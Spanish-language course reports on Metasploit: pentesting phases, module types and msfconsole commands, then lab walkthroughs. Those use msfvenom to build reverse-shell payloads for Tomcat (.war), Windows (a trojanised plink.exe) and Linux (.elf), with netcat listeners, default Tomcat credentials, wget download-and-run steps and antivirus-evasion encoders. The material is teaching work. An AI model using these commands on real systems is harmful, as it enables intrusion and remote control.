Documentos de Referencia: "AS-I - Metasploit.pdf"

# Informe Técnico: Metasploit Framework y Pentesting

## 1. Resumen Ejecutivo
Este informe detalla el uso de **Metasploit Framework**, una herramienta de código abierto fundamental para profesionales de ciberseguridad. Se diferencia entre el **pentesting** y el **análisis de vulnerabilidades**, y se explican las fases de un pentest. El documento describe la arquitectura modular de Metasploit, sus componentes y módulos principales, así como las distintas ediciones disponibles. Además, se incluyen procedimientos prácticos para el uso de la consola, la gestión de módulos y la interacción con objetivos, con el objetivo de demostrar su importancia estratégica tanto para **equipos ofensivos (Red Team)** como **defensivos (Blue Team)**.

---

## 2. Conceptos Fundamentales
* **Pentesting vs. Análisis de Vulnerabilidades:** Aunque se complementan, son conceptos distintos. El **análisis de vulnerabilidades** es un escaneo automatizado que identifica posibles debilidades en un sistema. En cambio, el **pentesting** es la práctica de explotar activamente estas debilidades para evaluar la resistencia de las defensas y obtener control sobre los sistemas o datos sensibles, simulando un ataque real de un hacker. Un análisis de vulnerabilidades dice *qué* posibles agujeros hay, mientras que un pentesting demuestra si se puede *entrar* por ellos.
* **Metasploit Framework:** Es un *framework* de explotación de código abierto, diseñado para realizar pentesting y ejecutar *exploits*. Fue creado en 2003 y adquirido por la empresa Rapid7, que lo reescribió en el lenguaje de programación **Ruby**. Su principal potencial reside en la **normalización de *exploits* y *payloads***, lo que permite a los profesionales optimizar el tiempo, evitando la investigación manual, adaptación y ejecución de código.
* **Arquitectura Modular:** El poder de Metasploit radica en su diseño modular, que permite a la comunidad de desarrolladores y a Rapid7 añadir rápidamente nuevos componentes para vulnerabilidades recién descubiertas.
    * **Librerías:** Son la base técnica del *framework*. **Rex** es la librería de bajo nivel para operaciones de red. **MSF Core** es el núcleo que carga y ejecuta los módulos, y **MSF Base** provee una API simplificada para los desarrolladores.
    * **Módulos:** Son las unidades funcionales del *framework*, agrupadas por su propósito. Hay varios tipos:
        * ***Exploits***: Código que aprovecha una vulnerabilidad para obtener acceso inicial a un sistema.
        * **Auxiliares:** Herramientas para tareas arbitrarias que no implican la ejecución de un *payload*, como escaneo de puertos, recolección de información o *fuzzing* de datos.
        * **Post-explotación:** Herramientas para acciones posteriores a la intrusión, como la escalada de privilegios, la captura de datos y el mantenimiento del acceso.
        * ***Payloads***: El código que se ejecuta en el sistema objetivo una vez que el *exploit* tiene éxito. Permiten controlar el sistema, abrir una *shell* y transferir archivos.
        * **Codificadores (*Encoders*):** Modifican el código de los *payloads* para evitar la detección por antivirus o sistemas de detección de intrusos.
        * **Evasión (*Evasion*):** Módulo específico para evadir antivirus, ofuscando el código para volverlo indetectable.
        * ***NOPs*:** Generadores de instrucciones nulas para rellenar búferes y estabilizar *exploits* en lenguaje ensamblador.
* **Ediciones de Metasploit:**
    * **Metasploit Framework:** Edición gratuita de línea de comandos, orientada a desarrolladores e investigadores de seguridad.
    * **Metasploit Express:** Versión de pago con interfaz gráfica, ya descontinuada, que se enfocaba en equipos de TI.
    * **Metasploit Pro:** Versión de pago con licencia de pago que continúa en uso. Ofrece una interfaz web, automatización avanzada y funciones como *phishing* dirigido.
    * **Metasploit Community:** Versión gratuita con interfaz web, descontinuada en 2019, que se dirigía a pequeñas empresas y estudiantes.

---

## 3. Procedimientos Prácticos
### Fases de un Pentesting
Los pasos de un pentesting, según la documentación de Rapid7, son:
1.  **Establecer el alcance (*Set the Scope*):** Definir claramente los objetivos, sistemas y aplicaciones a cubrir en la prueba de intrusión.
2.  **Reconocimiento y Descubrimiento:** Recopilar toda la información posible sobre los sistemas, servicios, puertos y usuarios.
3.  **Explotación:** Atacar los sistemas o aplicaciones vulnerables mediante fuerza bruta, *exploits* o ingeniería social.
4.  **Toma de Control y Pivoteo:** Una vez dentro, se pivota para acceder a otros activos de la red.
5.  **Recopilar Evidencia y Limpiar (*Gather Evidence and Cleanup*):** Se capturan pruebas (capturas de pantalla, *hashes*, archivos) y se eliminan los rastros para no dejar evidencia de la intrusión.
6.  **Reporte y Remediación:** Se redacta un informe detallado con las vulnerabilidades encontradas y se sugieren soluciones.

### Uso de la Consola de Metasploit (msfconsole)
La consola es la interfaz principal para interactuar con Metasploit. Al ejecutar el comando `msfconsole`, el *framework* se inicia y muestra un *banner* con el número de *exploits*, módulos auxiliares y *payloads* disponibles.

#### Comandos Principales
* **Comandos de ayuda:**
    * `help` o `?`: Muestra información general sobre comandos.
    * `banner`: Muestra un *banner* aleatorio de Metasploit.
* **Comandos de búsqueda y módulo:**
    * `search <palabra_clave>`: Permite buscar módulos (*exploits*, auxiliares, etc.) basándose en palabras clave, CVEs, plataformas o autores. Por ejemplo, `search eternalblue`. Se pueden usar filtros como `type` (ej. `search type:exploit`) o `rank` (ej. `search type:exploit -s rank`) para ordenar los resultados.
    * `info <nombre_o_ID_de_módulo>`: Muestra información detallada sobre un módulo específico, incluyendo la plataforma, si requiere privilegios, el *rank* de explotabilidad y opciones básicas.
    * `use <nombre_o_ID_de_módulo>`: Selecciona un módulo para interactuar con él, cambiando el *prompt* de la consola.
    * `back`: Sale del contexto del módulo actual y regresa a la raíz de la consola.
    * `show`: Muestra los módulos de un tipo específico (ej. `show exploits`, `show nops`). También puede usarse para ver opciones de un módulo con `show options`.
* **Comandos de configuración e interacción:**
    * `set <variable> <valor>`: Asigna un valor a una variable local del módulo activo. Por ejemplo, `set RHOSTS 10.0.1.9` para establecer la dirección IP del objetivo.
    * `unset <variable>`: Desasocia el valor de una variable local del módulo.
    * `setg <variable> <valor>`: Establece un valor para una variable **global** en todo Metasploit, que persistirá entre diferentes módulos.
    * `unsetg <variable>`: Desasocia el valor de una variable global.
    * `connect <host> <puerto>`: Permite la comunicación con un *host* remoto de forma similar a Netcat.
    * `load <plugin>`: Carga un *plugin* en el *framework*, como `nessus` o `sqlmap`, para integrar funcionalidades de otras herramientas. El comando `load -l` lista los *plugins* disponibles.
    * `unload <plugin>`: Descarga un *plugin*.
    * `loadpath <ruta>`: Permite cargar un módulo directamente desde una ruta del sistema de archivos sin necesidad de moverlo a la estructura de Metasploit y reiniciar.
    * `check`: Evalúa si un sistema objetivo es vulnerable antes de lanzar el *exploit*.
    * `exploit` o `run`: Lanza el *exploit* seleccionado para iniciar el ataque.
    * `sessions`: Muestra las conexiones o *shells* abiertas. Con `sessions -i <ID>` se puede interactuar con una sesión específica.
    * `jobs`: Lista los trabajos que se ejecutan en segundo plano. Se pueden terminar con `kill <ID_de_job>`.
    * `reload_all`: Recarga todos los módulos de Metasploit, similar a un reinicio, para aplicar cambios.
    * `save`: Guarda la configuración y el estado global de Metasploit.
    * `makerc <ruta_archivo>`: Guarda los comandos ejecutados recientemente en un archivo de texto. Por ejemplo, `makerc "/home/kali/Desktop/commands.txt"`.

---

## 4. Conclusiones y Puntos Clave
### Importancia y Beneficios de Seguridad
Metasploit no es solo una herramienta ofensiva; su verdadero valor radica en su capacidad para validar y fortalecer las defensas de una organización. Para el **Red Team**, facilita la simulación de ataques para identificar vulnerabilidades explotables. Para el **Blue Team**, permite reproducir escenarios de ataque para verificar las fallas detectadas por escáneres, priorizar la remediación de las más críticas y afinar los sistemas de detección y respuesta (IDS/IPS). Metasploit ayuda a reducir los **falsos positivos** y proporciona una comprensión profunda de las tácticas y técnicas de los atacantes, lo cual es esencial para diseñar controles de red efectivos.

### Puntos de Aprendizaje Clave
* El **pentesting** es una práctica estratégica y no un ataque al azar. La metodología, que incluye la recopilación de información, la validación y la post-explotación, es tan importante como la herramienta en sí.
* La **arquitectura modular** de Metasploit es su mayor fortaleza, ya que permite que la herramienta se mantenga actualizada y se adapte a las nuevas amenazas y vulnerabilidades descubiertas.
* El uso del comando **`check`** es crucial para validar la vulnerabilidad de un objetivo antes de lanzar un *exploit*, minimizando el riesgo de interrupción del sistema.
* Dominar la herramienta no se limita a memorizar comandos. La verdadera competencia reside en la capacidad de razonar como un atacante y aplicar la herramienta de forma inteligente y ética.
* La herramienta **Meterpreter** es el *payload* preferido por los profesionales debido a su capacidad de **evasión** y su flexibilidad para la post-explotación.

### Relevancia Técnica
El conocimiento de Metasploit es una habilidad indispensable en ciberseguridad. Su consola, **msfconsole**, integra una vasta gama de funcionalidades que van más allá de la simple explotación. Los procedimientos para la gestión de módulos, la configuración de variables locales y globales, la integración con otras herramientas como **Nessus** o **Nmap** (a través de *plugins* y comandos como `db_nmap`) y la gestión de sesiones y trabajos en segundo plano, demuestran la complejidad y el poder de este *framework*. Estas habilidades son aplicables en cualquier entorno de auditoría de seguridad y son una señal de un profesional que comprende el ciclo de vida de un ataque y sabe cómo defenderse de él.

---

Documentos de Referencia: "AS-I - Metasploit II.pdf"

# Informe Técnico: Herramientas del Metasploit Framework

### 1. Resumen Ejecutivo
Este informe técnico se centra en una clase didáctica sobre las herramientas del Metasploit Framework, un componente clave en el ámbito de la ciberseguridad. El material explora tanto herramientas obsoletas como las actuales, destacando la evolución de las funcionalidades de Metasploit. Se explican en detalle herramientas como `msfcli`, `msfpayload` y `msfencode`, que aunque han sido reemplazadas, son fundamentales para entender el origen de la herramienta moderna, **msfvenom**. Además, el informe documenta prácticas de laboratorio que demuestran la generación y uso de payloads para diferentes sistemas operativos, incluyendo Windows y Linux.

---

### 2. Conceptos Fundamentales

* **Metasploit Framework:** Un conjunto de herramientas de código abierto utilizado para la investigación de vulnerabilidades y el desarrollo de exploits. Permite a los profesionales de la seguridad probar la robustez de sus defensas.
* **`msfcli` (Obsoleto):** Era una interfaz de línea de comandos para Metasploit que permitía ejecutar exploits y módulos auxiliares directamente desde la terminal. Fue reemplazada por el comando `msfconsole` con el parámetro `-x` en junio de 2015.
* **`msfpayload` (Obsoleto):** Una interfaz de línea de comandos utilizada para generar y producir varios tipos de shellcode de payload. Fue eliminada en junio de 2015 y sus funciones fueron integradas en `msfvenom`.
* **`msfencode` (Obsoleto):** Una herramienta para codificar shellcode generado por `msfpayload`. Sus funciones incluían la transformación a caracteres alfanuméricos, la eliminación de caracteres no deseados, la codificación para diferentes arquitecturas y la ofuscación del código. Fue reemplazada por `msfvenom`.
* **`msfvenom`:** La herramienta actual del Metasploit Framework que combina las funcionalidades de `msfpayload` y `msfencode` en una sola. Es un generador de payloads independiente que permite crear y codificar código malicioso de forma simplificada.
* **Payload:** El código malicioso que se ejecuta en el sistema de destino después de una explotación exitosa.
* **Shellcode:** Un pequeño fragmento de código que se utiliza como payload para obtener una shell de comandos en el sistema de destino.
* **Análisis Estático de Antivirus:** Un método de detección que los antivirus utilizan para escanear archivos en busca de patrones de código, cadenas o bytes que coinciden con firmas de malware conocidas.
* **Análisis Dinámico de Antivirus:** Un método más avanzado, a menudo utilizado por EDRs (Endpoint Detection and Response), que ejecuta archivos en un entorno controlado (sandbox) para monitorear su comportamiento y detectar actividades maliciosas, como cambios en el sistema o conexiones no autorizadas.
* **Ofuscación:** Una técnica para modificar el código de un payload sin alterar su funcionalidad, con el objetivo de evadir la detección estática de los antivirus.

---

### 3. Procedimientos Prácticos

#### Práctica 1: Generación y Uso de un Payload `.war` para Servidor Apache Tomcat

Este procedimiento demuestra cómo generar un archivo `.war` malicioso utilizando `msfvenom` para explotar un servidor Apache Tomcat vulnerable y obtener una shell de comandos.

**Pasos:**
1.  **Escaneo de la red:** Se realiza un escaneo con `nmap` para identificar hosts y servicios en la red. El comando `nmap -v -sV -sC [rango_de_red]` se utiliza para un escaneo verboso, con detección de versiones de servicios y uso de scripts predeterminados. Se identificó un servidor Apache Tomcat en el host 10.0.1.11, puerto 8180.
2.  **Acceso al panel de administración:** Se accede al panel del Apache Tomcat a través del navegador. Se utilizan las credenciales por defecto (usuario `tomcat`, contraseña `tomcat`) para iniciar sesión. Una vez dentro, se observa la opción para desplegar archivos `.war`.
3.  **Generación del payload:** Se crea un payload de tipo `.war` usando el comando `msfvenom`.
    * **Comando:** `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.1.8 LPORT=4444 -f war -o shell.war`
    * **Explicación de los parámetros:**
        * `-p`: Especifica el payload. En este caso, `java/jsp_shell_reverse_tcp` es un payload para un servidor Java que inicia una conexión de regreso a la máquina del atacante.
        * `LHOST`: La dirección IP del atacante (local host), en este caso 10.0.1.8.
        * `LPORT`: El puerto que el atacante escuchará para la conexión de regreso.
        * `-f`: Define el formato de salida, que es `war` para el servidor Tomcat.
        * `-o`: Especifica el nombre y la ruta de salida del archivo generado.
4.  **Despliegue y ejecución del payload:** Se sube el archivo `shell.war` al panel de administración del servidor Apache Tomcat. Mientras se despliega, se abre un listener en la máquina del atacante.
5.  **Configuración del listener:** Para recibir la conexión inversa, se utiliza `netcat` como listener.
    * **Comando:** `nc -lvnp 4444`
    * **Explicación de los parámetros:**
        * `-l`: Inicia el modo de escucha.
        * `-v`: Modo verboso para ver el estado.
        * `-n`: Evita la resolución de DNS.
        * `-p`: Especifica el puerto de escucha.
6.  **Conexión y acceso:** Una vez que el archivo `.war` se ha desplegado en el servidor Tomcat, se accede a la URL `/shell` en el navegador. Esto provoca que el payload se ejecute y se establezca una conexión inversa con el listener de la máquina atacante. Se obtiene acceso a una shell de comandos en el sistema comprometido. Se demuestra el acceso ejecutando comandos como `whoami` y `uname -a`.

#### Práctica 2: Generación y Uso de un Payload `.exe` para Windows

Este procedimiento detalla cómo inyectar un payload en un archivo ejecutable legítimo de Windows y luego usarlo para obtener una shell de comandos.

**Pasos:**
1.  **Generación del ejecutable malicioso:** Se utiliza `msfvenom` para crear un ejecutable que contiene un payload de shell inversa.
    * **Comando:** `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.8 LPORT=444 -x /usr/share/windows-binaries/plink.exe -f exe -o plink_pro.exe`
    * **Explicación de los parámetros:**
        * `-p`: Payload para Windows.
        * `LHOST` y `LPORT`: La IP y el puerto de escucha del atacante.
        * `-x`: Especifica un archivo ejecutable existente (`plink.exe`) para usar como plantilla. El payload será inyectado en este binario.
        * `-f`: Formato de salida (`exe`).
        * `-o`: Nombre del archivo de salida.
2.  **Distribución del archivo:** Se utiliza un servidor HTTP de Python para compartir el archivo `.exe` con la máquina Windows.
    * **Comando:** `python3 -m http.server -b 0.0.0.0`
    * **Explicación:** Este comando inicia un servidor HTTP en el puerto 8000 en todas las interfaces de red (`0.0.0.0`), lo que permite que el archivo sea accesible desde la máquina Windows.
3.  **Descarga y ejecución:** Desde la máquina Windows, se accede al servidor HTTP del atacante a través del navegador. Se descarga y se ejecuta el archivo `plink_pro.exe`.
4.  **Apertura del listener y acceso:** Antes de la ejecución, se configura un listener en la máquina Kali con `netcat`. Al ejecutar el archivo en Windows, se establece una conexión inversa y se obtiene una shell de comandos en la terminal de Kali. Se muestra el acceso al sistema de Windows ejecutando el comando `whoami` y `systeminfo`.

#### Práctica 3: Generación y Uso de un Payload `.elf` para Linux

Este procedimiento se enfoca en la generación y el uso de un archivo ejecutable de Linux (`.elf`) para obtener una shell inversa en un servidor Ubuntu.

**Pasos:**
1.  **Verificación de formatos:** Se utiliza el comando `msfvenom -l formats | grep elf` para confirmar que el formato `.elf` es compatible.
2.  **Generación del payload:** Se crea un archivo ejecutable `.elf` para la arquitectura x64 de Linux.
    * **Comando:** `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.1.8 LPORT=4444 -f elf -o shell.elf`
    * **Explicación de los parámetros:**
        * `-p`: Payload para una shell inversa en Linux x64.
        * `LHOST` y `LPORT`: La IP y el puerto del atacante.
        * `-f`: Formato de salida (`elf`).
        * `-o`: Nombre del archivo de salida.
3.  **Asignación de permisos:** El archivo `.elf` generado no tiene permisos de ejecución por defecto. Se utilizan los comandos `ls -l` para verificar los permisos y `chmod 777 shell.elf` para otorgar permisos de lectura, escritura y ejecución a todos los usuarios.
4.  **Distribución y descarga del archivo:** Al igual que en la práctica anterior, se inicia un servidor HTTP de Python para compartir el archivo. Desde la máquina Ubuntu, se utiliza `wget` para descargarlo: `wget http://10.0.1.8:8000/shell.elf`.
5.  **Apertura del listener y acceso:** Se inicia un listener con `netcat` en la máquina Kali. Se ejecutan los comandos `sudo chmod +x shell.elf` y `./shell.elf` en el servidor Ubuntu. La conexión inversa se establece, proporcionando una shell de comandos en la terminal de Kali. Se muestra el acceso ejecutando comandos como `ls` y `uname -a`.

---

### 4. Conclusiones y Puntos Clave

#### Importancia y Beneficios de Seguridad
El estudio de herramientas como Metasploit y la práctica de la generación de payloads son cruciales en ciberseguridad. Permite a los profesionales simular ataques para identificar y corregir vulnerabilidades en los sistemas antes de que sean explotadas por actores maliciosos. El conocimiento de cómo funcionan los payloads y cómo los antivirus intentan detectarlos es fundamental para desarrollar estrategias de defensa más robustas y eficaces.

#### Puntos de Aprendizaje Clave
* **Evolución de las herramientas:** La evolución de herramientas como `msfcli`, `msfpayload` y `msfencode` hacia `msfvenom` demuestra la constante búsqueda de simplificación y eficiencia en el desarrollo de exploits. `msfvenom` es ahora una herramienta única y poderosa para la generación y codificación de payloads.
* **Ofuscación y evasión de antivirus:** Los antivirus emplean tanto el análisis estático (basado en firmas) como el dinámico (basado en comportamiento) para detectar malware. Las técnicas de ofuscación, como la codificación, y la evasión, como los flujos condicionales o la introducción de tiempos de espera, son métodos que los atacantes usan para sortear estas defensas, aunque la eficacia es limitada contra sistemas de seguridad modernos y actualizados.
* **Funcionalidad dinámica:** El codificador `x86/shikata_ga_nai` es un ejemplo de cómo los payloads pueden ser diseñados para generar una salida única en cada ejecución, lo que dificulta la detección basada en firmas estáticas.
* **Pruebas en entornos controlados:** Es vital realizar pruebas de penetración en entornos de laboratorio aislados para entender la funcionalidad de las herramientas y las técnicas de explotación sin causar daños a sistemas reales.

#### Relevancia Técnica
Los procedimientos aprendidos en este material tienen una alta relevancia técnica en un entorno profesional de seguridad. La capacidad de generar payloads personalizados para diferentes sistemas operativos y arquitecturas es una habilidad fundamental para los auditores de seguridad. El conocimiento de cómo evadir la detección de antivirus y la comprensión de sus mecanismos de detección son esenciales para realizar evaluaciones de seguridad exhaustivas y para informar a las organizaciones sobre las vulnerabilidades que no pueden ser detectadas por las soluciones de seguridad actuales. Aunque las técnicas de evasión pueden no funcionar en todos los casos, su estudio es clave para entender las limitaciones y fortalezas de las defensas de seguridad.